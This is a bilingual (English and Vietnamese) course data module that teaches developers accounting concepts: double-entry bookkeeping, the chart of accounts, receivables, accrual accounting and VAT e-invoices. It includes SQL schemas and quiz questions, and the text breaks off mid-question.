const s={id:"accounting",group:"domain",title:"Accounting for Developers",emoji:"📒",tagline:`Debit, credit and the rules behind every number.
VI: Nợ, Có và các quy tắc đằng sau mỗi con số.`,lessons:[{id:"accounting.double-entry",title:"Double-entry bookkeeping · Bút toán kép",summary:`Every transaction is written twice: once as debit, once as credit.
VI: Mỗi nghiệp vụ được ghi hai lần: một lần bên Nợ, một lần bên Có.`,minutes:4,blocks:[{type:"text",text:`Accounting records each money event as a **transaction** (nghiệp vụ). An **account** is a named bucket, like "Cash" or "Revenue". Each transaction touches at least two accounts.
VI: Kế toán ghi mỗi sự kiện liên quan đến tiền thành một nghiệp vụ. Tài khoản là một "ngăn" có tên, như "Tiền mặt" hay "Doanh thu". Mỗi nghiệp vụ tác động ít nhất hai tài khoản.`},{type:"text",text:`One side of an entry is the **debit** (Nợ). The other side is the **credit** (Có). In every entry, total debit = total credit. This is **double-entry bookkeeping**.
VI: Một vế của bút toán là bên Nợ. Vế còn lại là bên Có. Trong mọi bút toán, tổng Nợ = tổng Có. Đó là nguyên tắc ghi sổ kép.`},{type:"diagram",text:`T-accounts (tài khoản chữ T)

     111 Cash             511 Revenue
  Debit │ Credit       Debit │ Credit
 ───────┼───────      ───────┼───────
 110,000│                    │100,000
        │                    │

    3331 Output VAT
  Debit │ Credit
 ───────┼───────
        │ 10,000`},{type:"diagram",text:`Sell goods for cash, VAT 10% (example)

Account             Debit     Credit
──────────────── ───────── ─────────
111  Cash          110,000
511  Revenue                 100,000
3331 Output VAT               10,000
──────────────── ───────── ─────────
Total              110,000   110,000
                       └─ equal ─┘`},{type:"text",text:`Behind it all is the **accounting equation**: Assets = Liabilities + Equity. Assets and expenses grow on the debit side. Liabilities, equity and revenue grow on the credit side.
VI: Nền tảng là phương trình kế toán: Tài sản = Nợ phải trả + Vốn chủ sở hữu. Tài sản và chi phí tăng bên Nợ. Nợ phải trả, vốn chủ sở hữu và doanh thu tăng bên Có.`},{type:"example",title:"A phone shop sells a case",text:`The shop sells a phone case for 110,000 VND cash, VAT included. Entry 1: Debit 111 110,000 / Credit 511 100,000 / Credit 3331 10,000. The case cost the shop 60,000. Entry 2: Debit 632 60,000 / Credit 156 60,000.
VI: Cửa hàng bán một ốp lưng giá 110.000đ tiền mặt, đã gồm VAT. Bút toán 1: Nợ 111 110.000 / Có 511 100.000 / Có 3331 10.000. Giá vốn là 60.000đ. Bút toán 2: Nợ 632 60.000 / Có 156 60.000.`},{type:"code",code:{lang:"sql",text:`CREATE TABLE JournalEntry (
  Id        BIGINT PRIMARY KEY,
  EntryDate DATE NOT NULL,
  Status    VARCHAR(10) NOT NULL, -- Draft/Posted
  SourceDoc VARCHAR(30) NULL      -- 'INV-0001'
);
CREATE TABLE JournalLine (
  EntryId     BIGINT NOT NULL,
  AccountCode VARCHAR(10) NOT NULL,
  Debit       DECIMAL(19,2) NOT NULL DEFAULT 0,
  Credit      DECIMAL(19,2) NOT NULL DEFAULT 0
);`}},{type:"text",text:`IT rules: save the header and all lines in one database transaction. Reject the entry if debit ≠ credit. A **posted** entry is never edited. To undo it, post a **reversing entry** with debit and credit swapped.
VI: Quy tắc cho IT: lưu phần đầu và mọi dòng trong một transaction. Từ chối bút toán nếu Nợ ≠ Có. Bút toán đã ghi sổ thì không sửa. Muốn hủy, ghi một bút toán đảo ngược, đổi Nợ và Có.`}],remember:`Every entry: total debit = total credit. No exceptions.
VI: Mọi bút toán: tổng Nợ = tổng Có. Không có ngoại lệ.`,questions:[{id:"accounting.double-entry.1",kind:"mcq",difficulty:"easy",prompt:`A shop sells goods for 200,000 VND in cash. There is no VAT. Which entry is right?
VI: Cửa hàng bán hàng thu 200.000đ tiền mặt. Không có VAT. Bút toán nào đúng?`,choices:["Debit 511 / Credit 111","Debit 111 / Credit 511","Debit 111 / Credit 131","Debit 632 / Credit 111"],answer:1,why:`Cash is an asset and it goes up, so debit 111. Revenue goes up, so credit 511.
VI: Tiền mặt là tài sản và tăng lên, nên ghi Nợ 111. Doanh thu tăng, nên ghi Có 511.`},{id:"accounting.double-entry.2",kind:"truefalse",difficulty:"easy",prompt:`An entry with debit 110,000 and credit 100,000 is fine, because the missing 10,000 is "just VAT".
VI: Bút toán Nợ 110.000 và Có 100.000 vẫn ổn, vì 10.000 còn thiếu "chỉ là VAT".`,choices:["True","False"],answer:1,why:`Debit must equal credit in every entry. The VAT needs its own credit line on 3331.
VI: Nợ phải bằng Có trong mọi bút toán. Tiền VAT cần một dòng Có riêng vào 3331.`},{id:"accounting.double-entry.3",kind:"debug",difficulty:"medium",prompt:`The trial balance (list of all account totals) is off by exactly 10,000 VND. Total debit is bigger. The invoice import job crashed yesterday. Most likely cause?
VI: Bảng cân đối số phát sinh lệch đúng 10.000đ. Tổng Nợ lớn hơn. Hôm qua job nhập hóa đơn bị lỗi giữa chừng. Nguyên nhân nhiều khả năng nhất?`,choices:[`An entry was saved without its VAT credit line
VI: Một bút toán được lưu mà thiếu dòng Có VAT`,`The report rounds every amount to thousands
VI: Báo cáo làm tròn mọi số tiền đến hàng nghìn`,`The database server clock was a few hours off
VI: Đồng hồ máy chủ database bị lệch vài giờ`,`A user opened the report before the job ended
VI: Người dùng mở báo cáo trước khi job chạy xong`],answer:0,why:`The job saved some lines but crashed before the 10,000 VAT line. Header and lines must be saved in one transaction.
VI: Job đã lưu một số dòng nhưng lỗi trước dòng VAT 10.000. Phần đầu và các dòng phải lưu trong cùng một transaction.`},{id:"accounting.double-entry.4",kind:"code",difficulty:"hard",prompt:`What does this call return, and is that a problem?
VI: Lời gọi này trả về gì, và đó có phải là vấn đề không?`,code:{lang:"ts",text:`type Line = { debit: number; credit: number };

function isBalanced(ls: Line[]): boolean {
  const d = ls.reduce((s, x) => s + x.debit, 0);
  const c = ls.reduce((s, x) => s + x.credit, 0);
  return d === c && ls.length >= 2;
}

isBalanced([{ debit: 0, credit: 0 },
            { debit: 0, credit: 0 }]);`},choices:["false, because both totals are zero","true, and an empty entry gets posted","true, and that is the right result","It throws, because the totals are 0"],answer:1,why:`Zero equals zero, so the check passes. An entry with no amount is noise in the books. Also reject lines where debit and credit are both zero.
VI: Không bằng không nên kiểm tra vẫn qua. Bút toán không có số tiền chỉ làm rối sổ. Hãy chặn cả dòng có Nợ và Có đều bằng 0.`}]},{id:"accounting.chart-of-accounts",title:"Chart of accounts · Hệ thống tài khoản",summary:`The list of all accounts, organised as a tree.
VI: Danh sách mọi tài khoản, sắp xếp theo dạng cây.`,minutes:4,blocks:[{type:"text",text:`The **chart of accounts** is the list of every account a company uses. Each account has a code and a name. In the Vietnamese chart of accounts, the first digit shows the group.
VI: Hệ thống tài khoản là danh sách mọi tài khoản công ty sử dụng. Mỗi tài khoản có mã và tên. Trong hệ thống tài khoản Việt Nam, chữ số đầu cho biết nhóm.`},{type:"diagram",text:`Chart of accounts (Hệ thống tài khoản)
├─ 1, 2  Assets (Tài sản)
│   ├─ 111  Cash
│   ├─ 112  Bank
│   ├─ 131  Receivable from customers
│   ├─ 133  Input VAT
│   └─ 156  Goods
├─ 3     Liabilities (Nợ phải trả)
│   ├─ 331  Payable to suppliers
│   └─ 333  Taxes payable
│       └─ 3331 Output VAT
├─ 4     Equity (Vốn chủ sở hữu)
├─ 5     Revenue (Doanh thu)
│   └─ 511  Sales revenue
└─ 6     Costs (Chi phí)
    └─ 632  Cost of goods sold`},{type:"text",text:"Accounts form a **tree**. A child account like `3331` adds detail to its parent `333`. Reports add the children up into the parent.\nVI: Các tài khoản tạo thành cây. Tài khoản con như `3331` chi tiết hơn cho tài khoản cha `333`. Báo cáo cộng các tài khoản con lên tài khoản cha."},{type:"text",text:`Post only to **leaf** accounts, that is, accounts with no children. If you post to a parent, its total no longer equals the sum of its children.
VI: Chỉ hạch toán vào tài khoản chi tiết nhất, tức là tài khoản không có con. Nếu ghi vào tài khoản cha, tổng của nó sẽ không còn bằng tổng các tài khoản con.`},{type:"example",title:"Selling on credit",text:`A wholesaler sells goods for 50m VND plus 5m VAT. The customer will pay later. Debit 131 55m / Credit 511 50m / Credit 3331 5m. Next week the customer pays by bank: Debit 112 55m / Credit 131 55m.
VI: Một nhà phân phối bán hàng 50 triệu, VAT 5 triệu. Khách trả sau. Nợ 131 55tr / Có 511 50tr / Có 3331 5tr. Tuần sau khách chuyển khoản: Nợ 112 55tr / Có 131 55tr.`},{type:"compare",left:{title:"Account per customer ⚠️",items:[`131001, 131002, 131003…
VI: 131001, 131002, 131003…`,`Chart changes for each new customer
VI: Mỗi khách mới lại sửa hệ thống tài khoản`,`Thousands of accounts
VI: Hàng nghìn tài khoản`]},right:{title:"131 + partner field ✅",items:[`One account 131, one PartnerId column
VI: Một tài khoản 131, một cột PartnerId`,`The chart stays small
VI: Hệ thống tài khoản gọn`,`Sub-ledger reports by customer
VI: Sổ chi tiết công nợ theo từng khách`]}},{type:"code",code:{lang:"sql",text:`CREATE TABLE Account (
  Code       VARCHAR(10) PRIMARY KEY, -- '3331'
  ParentCode VARCHAR(10) NULL,        -- '333'
  Name       NVARCHAR(200) NOT NULL,
  Type       VARCHAR(10) NOT NULL,
    -- Asset/Liability/Equity/Revenue/Expense
  IsLeaf     BIT NOT NULL, -- can post here?
  NeedsPartner BIT NOT NULL, -- 131, 331: yes
  IsActive   BIT NOT NULL
);`}},{type:"list",items:[`Ask: which accounts need a partner (customer, supplier, employee)?
VI: Hỏi: tài khoản nào cần theo dõi đối tượng (khách hàng, nhà cung cấp, nhân viên)?`,`Ask: who maps "sales invoice → revenue account"? Keep it in a table, not in code.
VI: Hỏi: ai quyết định "hóa đơn bán → tài khoản doanh thu"? Lưu trong bảng, không viết cứng trong code.`,`Ask: can an account be closed? What happens to its old entries?
VI: Hỏi: tài khoản có được ngừng dùng không? Bút toán cũ của nó thì sao?`]}],remember:`Account code = where the money sits. Partner field = who it is about.
VI: Mã tài khoản cho biết tiền nằm ở đâu. Trường đối tượng cho biết của ai.`,questions:[{id:"accounting.chart-of-accounts.1",kind:"mcq",difficulty:"easy",prompt:`A customer bought on credit and still owes us. Which account holds that amount?
VI: Khách mua chịu và vẫn còn nợ mình. Số tiền đó nằm ở tài khoản nào?`,choices:["331","131","511","111"],answer:1,why:`131 is receivables from customers. 331 is the opposite: what we owe suppliers.
VI: 131 là phải thu của khách hàng. 331 thì ngược lại: phải trả cho người bán.`},{id:"accounting.chart-of-accounts.2",kind:"truefalse",difficulty:"easy",prompt:`Revenue accounts like 511 increase on the credit side.
VI: Tài khoản doanh thu như 511 tăng bên Có.`,choices:["True","False"],answer:0,why:`Revenue grows on the credit side, like liabilities and equity. Assets and expenses grow on the debit side.
VI: Doanh thu tăng bên Có, giống nợ phải trả và vốn chủ sở hữu. Tài sản và chi phí tăng bên Nợ.`},{id:"accounting.chart-of-accounts.3",kind:"scenario",difficulty:"medium",prompt:`Sales wants a new account for each new customer: 131001, 131002, and so on. What do you suggest?
VI: Phòng kinh doanh muốn mỗi khách mới có một tài khoản riêng: 131001, 131002… Bạn đề xuất gì?`,choices:[`Keep 131 and store the customer in a partner column
VI: Giữ 131 và lưu khách hàng ở cột đối tượng`,`Create the accounts by code when a customer signs up
VI: Tự tạo tài khoản bằng code khi có khách mới`,`Post all customers to 511 and add a note field
VI: Ghi mọi khách vào 511 và thêm cột ghi chú`,`Use 331 for customers who owe a large amount
VI: Dùng 331 cho khách nợ nhiều tiền`],answer:0,why:`Detail by customer belongs in a partner column and the sub-ledger. A new account per customer bloats the chart.
VI: Chi tiết theo khách nên nằm ở cột đối tượng và sổ chi tiết. Mỗi khách một tài khoản làm hệ thống tài khoản phình to.`},{id:"accounting.chart-of-accounts.4",kind:"compare",difficulty:"medium",prompt:`Where should the system decide that a sales invoice posts to 511?
VI: Hệ thống nên quyết định ở đâu rằng hóa đơn bán hàng ghi vào 511?`,choices:["A constant `511` inside the invoice service\nVI: Hằng số `511` trong service hóa đơn",`A posting-map table the accountant can edit
VI: Bảng cấu hình hạch toán kế toán sửa được`,`The user picks the account on each invoice
VI: Người dùng tự chọn tài khoản trên từng hóa đơn`,`A SQL trigger on the invoice table
VI: Một trigger SQL trên bảng hóa đơn`],answer:1,why:`Accounting owns these rules and they change. A table lets them update the mapping without a new release.
VI: Kế toán quản lý các quy tắc này và chúng thay đổi. Dùng bảng cấu hình thì sửa được mà không cần phát hành bản mới.`},{id:"accounting.chart-of-accounts.5",kind:"debug",difficulty:"hard",prompt:`Report: account 333 shows 120m. Its children 3331 + 3332 + 3334 add up to 100m. Most likely cause?
VI: Báo cáo: tài khoản 333 là 120 triệu. Các tài khoản con 3331 + 3332 + 3334 cộng lại 100 triệu. Nguyên nhân nhiều khả năng nhất?`,choices:[`Some lines were posted to 333 directly
VI: Có dòng được ghi thẳng vào tài khoản 333`,`The report hides child accounts with zero
VI: Báo cáo ẩn tài khoản con có số dư 0`,`Account 3331 is set to inactive this year
VI: Tài khoản 3331 bị ngừng dùng năm nay`,`The report rounds the parent to millions
VI: Báo cáo làm tròn tài khoản cha đến triệu`],answer:0,why:`Lines posted to a parent are not in any child. Block posting to non-leaf accounts.
VI: Dòng ghi vào tài khoản cha không thuộc tài khoản con nào. Hãy chặn ghi vào tài khoản không phải chi tiết nhất.`}]},{id:"accounting.receivables-payables",title:"Receivables and payables · Công nợ phải thu, phải trả",summary:`Who owes us, whom we owe, and for how long.
VI: Ai nợ mình, mình nợ ai, và nợ bao lâu.`,minutes:5,blocks:[{type:"text",text:`A **receivable** is money customers owe us (công nợ phải thu, 131). A **payable** is money we owe suppliers (công nợ phải trả, 331).
VI: Phải thu là tiền khách hàng nợ mình (tài khoản 131). Phải trả là tiền mình nợ nhà cung cấp (tài khoản 331).`},{type:"text",text:`A payment is **allocated** (matched) to invoices. One payment can pay many invoices. One invoice can get many partial payments. m = million VND.
VI: Một lần thanh toán được cấn trừ vào các hóa đơn. Một khoản thu có thể trả nhiều hóa đơn. Một hóa đơn có thể được trả nhiều lần. m = triệu đồng.`},{type:"diagram",text:`Customer: Minh An Co. (limit 200m)

Invoice  Total  Paid   Open  Status
───────  ─────  ─────  ────  ───────
INV-101  100m   100m    0m   Paid
INV-102   50m    30m   20m   Partial
INV-103   40m     0m   40m   Open
───────  ─────  ─────  ────  ───────
Sum      190m   130m   60m

PAY-55 130m ─┬─▶ INV-101  100m
             └─▶ INV-102   30m`},{type:"code",code:{lang:"sql",text:`-- many payments <-> many invoices
CREATE TABLE PaymentAllocation (
  PaymentId BIGINT NOT NULL,
  InvoiceId BIGINT NOT NULL,
  Amount    DECIMAL(19,2) NOT NULL
);
-- Open = Invoice.Total - SUM(Amount)
-- Overdue = Open > 0 AND DueDate < today`}},{type:"diagram",text:`Aging (tuổi nợ) = days past the due date

Bucket     Invoices   Open amount
─────────  ────────   ───────────
Not due       12         300m
0–30 days      5          80m
31–60          3          45m
61–90          1          20m
90+            2          60m  ← call
                               them now`},{type:"text",text:`A **credit limit** (hạn mức công nợ) is the most a customer may owe. A new order that goes over the limit is blocked or sent for approval.
VI: Hạn mức công nợ là số tiền tối đa khách được nợ. Đơn hàng mới làm vượt hạn mức sẽ bị chặn hoặc phải chờ duyệt.`},{type:"example",title:"The payment nobody matched",text:`A customer transfers 30m with the note "TT HD 102". The accountant records it in 112 but does not allocate it. The aging report still shows INV-102 as late. Sales then blocks the next order by mistake.
VI: Khách chuyển khoản 30 triệu với nội dung "TT HD 102". Kế toán ghi vào 112 nhưng chưa cấn trừ hóa đơn. Báo cáo tuổi nợ vẫn báo INV-102 quá hạn. Phòng kinh doanh chặn nhầm đơn tiếp theo.`},{type:"list",items:[`Count age from the invoice date or the due date?
VI: Tính tuổi nợ từ ngày hóa đơn hay ngày đến hạn?`,`Over the credit limit: block the order, or ask a manager?
VI: Vượt hạn mức: chặn đơn hay xin quản lý duyệt?`,`A customer is also a supplier: can we offset the two balances?
VI: Khách hàng đồng thời là nhà cung cấp: có bù trừ công nợ không?`,`A payment arrives with no invoice number: who matches it, and how?
VI: Tiền về không ghi số hóa đơn: ai cấn trừ, và cấn trừ thế nào?`]}],remember:`Open amount = invoice total − allocated payments. Age it from the due date.
VI: Số còn nợ = tổng hóa đơn − các khoản đã cấn trừ. Tính tuổi nợ từ ngày đến hạn.`,questions:[{id:"accounting.receivables-payables.1",kind:"scenario",difficulty:"easy",prompt:`Invoice INV-200 is 100m VND. The customer pays 60m. What should the system show?
VI: Hóa đơn INV-200 là 100 triệu. Khách trả 60 triệu. Hệ thống nên hiển thị gì?`,choices:["Status Paid; the rest is a discount","Status Open; open amount 100m","Status Partial; open amount 40m","Status Paid; 40m moves to a new invoice"],answer:2,why:`The invoice is partly paid and 40m is still owed. Only the business can decide to write off or discount the rest.
VI: Hóa đơn mới trả một phần, còn nợ 40 triệu. Chỉ nghiệp vụ mới được quyết định xóa nợ hay chiết khấu phần còn lại.`},{id:"accounting.receivables-payables.2",kind:"code",difficulty:"easy",prompt:`An invoice was due 45 days ago and is still open. Which bucket does this query give?
VI: Hóa đơn đã quá hạn 45 ngày và chưa trả. Câu truy vấn này xếp vào nhóm nào?`,code:{lang:"sql",text:`-- DaysLate = today - DueDate
SELECT InvoiceNo,
  CASE
    WHEN DaysLate <= 0  THEN 'Not due'
    WHEN DaysLate <= 30 THEN '0-30'
    WHEN DaysLate <= 60 THEN '31-60'
    WHEN DaysLate <= 90 THEN '61-90'
    ELSE '90+'
  END AS Bucket
FROM OpenInvoices;`},choices:["0-30","31-60","61-90","90+"],answer:1,why:"45 is not ≤ 30, but it is ≤ 60. `CASE` stops at the first true branch.\nVI: 45 không ≤ 30 nhưng ≤ 60. `CASE` dừng ở nhánh đúng đầu tiên."},{id:"accounting.receivables-payables.3",kind:"debug",difficulty:"medium",prompt:`A customer says: "We paid everything last week." The money is in account 112. The aging report still shows them 90+ days late. Most likely cause?
VI: Khách nói: "Tuần trước chúng tôi đã trả hết." Tiền đã vào 112. Báo cáo tuổi nợ vẫn báo quá hạn trên 90 ngày. Nguyên nhân nhiều khả năng nhất?`,choices:[`The aging counts from the invoice date
VI: Tuổi nợ tính từ ngày hóa đơn`,`The payment was never allocated
VI: Khoản thu chưa được cấn trừ hóa đơn`,`The bank transfer is still pending
VI: Lệnh chuyển khoản vẫn đang chờ`,`The credit limit is set too low
VI: Hạn mức công nợ đặt quá thấp`],answer:1,why:`The money arrived but no invoice is linked to it, so every invoice still looks open. Changing the start date would not hide an invoice that is fully paid.
VI: Tiền đã về nhưng chưa gắn với hóa đơn nào, nên hóa đơn vẫn như chưa trả. Đổi ngày bắt đầu tính cũng không làm hóa đơn đã trả hết biến mất.`},{id:"accounting.receivables-payables.4",kind:"compare",difficulty:"medium",prompt:`How should the system know that an invoice is overdue?
VI: Hệ thống nên biết hóa đơn quá hạn bằng cách nào?`,choices:[`A nightly job sets IsOverdue = 1
VI: Job ban đêm đặt IsOverdue = 1`,`Compute it from DueDate and open amount
VI: Tính từ DueDate và số còn nợ`,`The accountant ticks a box by hand
VI: Kế toán tự đánh dấu bằng tay`,`Save a flag when the invoice is created
VI: Lưu cờ khi tạo hóa đơn`],answer:1,why:`Overdue depends on today and on payments, so it changes by itself. A stored flag goes stale when a payment arrives or the job fails.
VI: Quá hạn phụ thuộc ngày hôm nay và các khoản đã trả, nên tự thay đổi. Cờ lưu sẵn sẽ sai khi có tiền về hoặc job lỗi.`},{id:"accounting.receivables-payables.5",kind:"perf",difficulty:"hard",prompt:`The aging report for 20,000 open invoices takes 4 minutes. The code loops over invoices and runs one SUM query per invoice. What do you fix first?
VI: Báo cáo tuổi nợ cho 20.000 hóa đơn mất 4 phút. Code lặp từng hóa đơn và chạy một câu SUM cho mỗi hóa đơn. Bạn sửa gì trước?`,choices:[`Add more RAM to the web server
VI: Thêm RAM cho web server`,`Run the report only at night
VI: Chỉ chạy báo cáo vào ban đêm`,`One query with GROUP BY InvoiceId
VI: Một câu truy vấn với GROUP BY InvoiceId`,`Cache the report for one week
VI: Lưu cache báo cáo trong một tuần`],answer:2,why:`20,000 small queries means 20,000 round trips to the database. One grouped query does the same work at once.
VI: 20.000 câu truy vấn nhỏ là 20.000 lần gọi database. Một câu có GROUP BY làm cùng việc đó trong một lần.`}]},{id:"accounting.accrual-vs-cash",title:"Accrual vs cash · Cơ sở dồn tích và cơ sở tiền",summary:`Record revenue when it is earned, not when the money arrives.
VI: Ghi doanh thu khi đã thực hiện, không phải khi tiền về.`,minutes:4,blocks:[{type:"text",text:`**Cash basis**: record when money moves. **Accrual basis** (cơ sở dồn tích): record revenue when it is earned and expenses when they happen. Company accounting in Vietnam uses the accrual basis.
VI: Cơ sở tiền: ghi khi tiền thực sự thu hoặc chi. Cơ sở dồn tích: ghi doanh thu khi đã thực hiện, ghi chi phí khi phát sinh. Kế toán doanh nghiệp ở Việt Nam dùng cơ sở dồn tích.`},{type:"diagram",text:`       December          January
 ─────────┼─────────────────┼──────▶ time
          │                 │
   goods delivered     customer pays
   invoice issued      110m to bank
          │                 │
 Accrual: revenue      no new revenue
          in Dec       (Debit 112 /
                        Credit 131)
 Cash:    nothing      revenue in Jan`},{type:"text",text:`Why? A monthly report must show what the company really did that month. Cash can arrive early or late.
VI: Tại sao? Báo cáo tháng phải cho thấy công ty thực sự làm được gì trong tháng đó. Tiền có thể về sớm hoặc muộn.`},{type:"diagram",text:`Prepaid expense (Chi phí trả trước, 242)
Jan: pay 120m rent for 12 months
     Debit 242 120m / Credit 112 120m
Each month: move 10m to expense
     Debit 642 10m / Credit 242 10m

Accrued expense (Chi phí phải trả, 335)
Dec: power used, bill comes in Jan
     Debit 642 / Credit 335 (estimate)
Jan: bill arrives → clear 335`},{type:"text",text:`The same works for revenue. A customer who pays before delivery has not bought anything yet. That money is a liability until we deliver.
VI: Doanh thu cũng vậy. Khách trả tiền trước khi giao hàng thì chưa phải doanh thu. Số tiền đó là khoản nợ cho đến khi mình giao hàng.`},{type:"example",title:"A software subscription",text:`A customer pays 12m VND in January for a 12-month subscription. Revenue is 1m in each month, not 12m in January. The system needs a schedule: one row per month to recognise.
VI: Khách trả 12 triệu vào tháng 1 cho gói dịch vụ 12 tháng. Mỗi tháng ghi nhận 1 triệu doanh thu, không phải 12 triệu trong tháng 1. Hệ thống cần một lịch phân bổ: mỗi tháng một dòng.`},{type:"code",code:{lang:"sql",text:`-- one row per month to recognise
CREATE TABLE RevenueSchedule (
  ContractId BIGINT NOT NULL,
  Period     CHAR(7) NOT NULL, -- '2026-03'
  Amount     DECIMAL(19,2) NOT NULL,
  EntryId    BIGINT NULL -- set when posted
);`}},{type:"list",items:[`Which date makes revenue: order, delivery or invoice date?
VI: Ngày nào ghi nhận doanh thu: ngày đặt hàng, ngày giao hay ngày hóa đơn?`,`A subscription is cancelled mid-way: do we refund the rest?
VI: Hủy gói giữa chừng: có hoàn lại phần còn lại không?`,`Who estimates accrued costs, and when is the real bill matched?
VI: Ai ước tính chi phí phải trả, và khi nào đối chiếu với hóa đơn thật?`]}],remember:`Revenue follows the work, not the money.
VI: Doanh thu đi theo việc đã làm, không theo dòng tiền.`,questions:[{id:"accounting.accrual-vs-cash.1",kind:"mcq",difficulty:"easy",prompt:`Goods are delivered and invoiced on 28 December. The customer pays on 15 January. On the accrual basis, when is the revenue?
VI: Hàng giao và xuất hóa đơn ngày 28/12. Khách trả tiền ngày 15/1. Theo cơ sở dồn tích, doanh thu ghi vào khi nào?`,choices:["January","December","Half in each month","When the bank confirms"],answer:1,why:`The sale happened in December, so the revenue belongs there. In January the receivable 131 simply turns into cash.
VI: Việc bán hàng xảy ra trong tháng 12 nên doanh thu thuộc tháng 12. Sang tháng 1, khoản phải thu 131 chỉ chuyển thành tiền.`},{id:"accounting.accrual-vs-cash.2",kind:"scenario",difficulty:"medium",prompt:`In January the company pays 120m VND for 12 months of office rent. What is the rent expense in the January report?
VI: Tháng 1 công ty trả 120 triệu tiền thuê văn phòng cho 12 tháng. Chi phí thuê trên báo cáo tháng 1 là bao nhiêu?`,choices:["120m","0m","10m","60m"],answer:2,why:`The 120m goes to prepaid expense (242). Each month, 10m moves into expense.
VI: 120 triệu ghi vào chi phí trả trước (242). Mỗi tháng phân bổ 10 triệu vào chi phí.`},{id:"accounting.accrual-vs-cash.3",kind:"truefalse",difficulty:"easy",prompt:`If the bank balance went up by 500m this month, the profit for this month is 500m.
VI: Nếu số dư ngân hàng tăng 500 triệu trong tháng, thì lợi nhuận tháng đó là 500 triệu.`,choices:["True","False"],answer:1,why:`Cash can come from old sales, loans or customer prepayments. Profit is revenue earned minus expenses incurred.
VI: Tiền có thể đến từ bán hàng tháng trước, khoản vay hoặc khách trả trước. Lợi nhuận là doanh thu đã thực hiện trừ chi phí đã phát sinh.`},{id:"accounting.accrual-vs-cash.4",kind:"debug",difficulty:"hard",prompt:"Your monthly revenue dashboard never matches the accounting report. Your query sums `Payment.Amount` grouped by `PaymentDate`. Why?\nVI: Dashboard doanh thu tháng không bao giờ khớp báo cáo kế toán. Câu truy vấn của bạn cộng `Payment.Amount` theo `PaymentDate`. Tại sao?",choices:[`It shows cash received, not revenue earned
VI: Nó cho thấy tiền đã thu, không phải doanh thu`,`The dashboard uses a different time zone
VI: Dashboard dùng múi giờ khác`,`SUM skips rows where the amount is NULL
VI: SUM bỏ qua các dòng có số tiền NULL`,`Payments are stored in a separate schema
VI: Khoản thu được lưu ở schema khác`],answer:0,why:`Payments follow cash, so the timing is wrong for revenue. Payments also include VAT. Read revenue from posted revenue lines (511) by entry date.
VI: Khoản thu đi theo dòng tiền nên sai thời điểm ghi nhận doanh thu. Khoản thu còn gồm cả VAT. Hãy lấy doanh thu từ các dòng đã ghi sổ vào 511 theo ngày hạch toán.`}]},{id:"accounting.vat-einvoice",title:"VAT and e-invoices · Thuế GTGT và hóa đơn điện tử",summary:`VAT to pay = output VAT − input VAT. An issued e-invoice is never edited.
VI: Thuế GTGT phải nộp = thuế đầu ra − thuế đầu vào. Hóa đơn điện tử đã phát hành thì không sửa.`,minutes:5,blocks:[{type:"text",text:`**VAT** (value added tax, thuế GTGT) is added on top of the sale price. The seller collects it and pays it to the state.
VI: Thuế GTGT được cộng thêm vào giá bán. Người bán thu hộ và nộp cho Nhà nước.`},{type:"text",text:`**Output VAT** (3331) is VAT on what we sell. **Input VAT** (133) is VAT on what we buy. With the deduction method, we pay the difference.
VI: Thuế GTGT đầu ra (3331) là thuế trên hàng mình bán. Thuế GTGT đầu vào (133) là thuế trên hàng mình mua. Theo phương pháp khấu trừ, mình nộp phần chênh lệch.`},{type:"diagram",text:`Example rate: 10% VAT

Buy   200m + input VAT   20m  (133)
Sell  300m + output VAT  30m  (3331)

VAT to pay = output − input
           = 30m − 20m = 10m

If input > output: nothing to pay;
the rest can carry to the next period.`},{type:"text",text:`An **e-invoice** (hóa đơn điện tử) is the legal invoice. After it is issued and sent, nobody edits it. A mistake is fixed with a new invoice that points to the old one.
VI: Hóa đơn điện tử là hóa đơn có giá trị pháp lý. Sau khi phát hành và gửi đi, không ai được sửa. Sai sót được xử lý bằng một hóa đơn mới tham chiếu hóa đơn cũ.`},{type:"diagram",text:`Draft ── issue ──▶ Issued (locked)
  ▲                   │
  └─ edit freely      ├─▶ Adjusted
                      │   by an adjustment
                      │   invoice
                      └─▶ Replaced
                          by a replacement
                          invoice`},{type:"compare",left:{title:"Adjustment (điều chỉnh)",items:[`The original stays valid
VI: Hóa đơn gốc vẫn còn hiệu lực`,`Adds or reduces the wrong amounts
VI: Tăng hoặc giảm phần bị sai`,`Links to the original invoice
VI: Tham chiếu hóa đơn gốc`]},right:{title:"Replacement (thay thế)",items:[`The original is no longer valid
VI: Hóa đơn gốc không còn hiệu lực`,`A full new invoice, all data correct
VI: Hóa đơn mới đầy đủ, dữ liệu đúng`,`Also links to the original invoice
VI: Cũng tham chiếu hóa đơn gốc`]}},{type:"example",title:"Wrong unit price",text:`A shop issued an e-invoice at 1,500,000 instead of 1,050,000. A developer must not run UPDATE on it. The accountant chooses an adjustment or a replacement invoice. The system must support both.
VI: Cửa hàng xuất hóa đơn điện tử giá 1.500.000 thay vì 1.050.000. Lập trình viên không được UPDATE hóa đơn đó. Kế toán chọn lập hóa đơn điều chỉnh hoặc thay thế. Hệ thống phải hỗ trợ cả hai.`},{type:"list",items:[`Keep: invoice symbol (ký hiệu) and number (số hóa đơn), issue date
VI: Lưu: ký hiệu, số hóa đơn, ngày lập`,`Keep: seller and buyer names and tax codes (mã số thuế)
VI: Lưu: tên và mã số thuế người bán, người mua`,`Keep per line: item, quantity, unit price, VAT rate, VAT amount
VI: Lưu từng dòng: hàng hóa, số lượng, đơn giá, thuế suất, tiền thuế`,`Keep: status, the original invoice link, and the signed XML file
VI: Lưu: trạng thái, liên kết hóa đơn gốc và file XML đã ký`]}],remember:`Never edit an issued e-invoice. Fix it with an adjustment or a replacement invoice.
VI: Không bao giờ sửa hóa đơn điện tử đã phát hành. Xử lý bằng hóa đơn điều chỉnh hoặc thay thế.`,questions:[{id:"accounting.vat-einvoice.1",kind:"mcq",difficulty:"easy",prompt:`This month, output VAT is 50m and input VAT is 30m (example numbers). How much VAT does the company pay?
VI: Tháng này thuế đầu ra 50 triệu, thuế đầu vào 30 triệu (số ví dụ). Công ty phải nộp bao nhiêu thuế GTGT?`,choices:["80m","50m","20m","30m"],answer:2,why:`VAT to pay = output − input = 50m − 30m = 20m.
VI: Thuế phải nộp = đầu ra − đầu vào = 50 − 30 = 20 triệu.`},{id:"accounting.vat-einvoice.2",kind:"scenario",difficulty:"medium",prompt:`An e-invoice was issued and sent with the wrong quantity. Support asks you to fix the row in the database. What do you do?
VI: Hóa đơn điện tử đã phát hành và gửi đi bị sai số lượng. Bộ phận hỗ trợ nhờ bạn sửa dòng đó trong database. Bạn làm gì?`,choices:[`Update the quantity, then resend the PDF
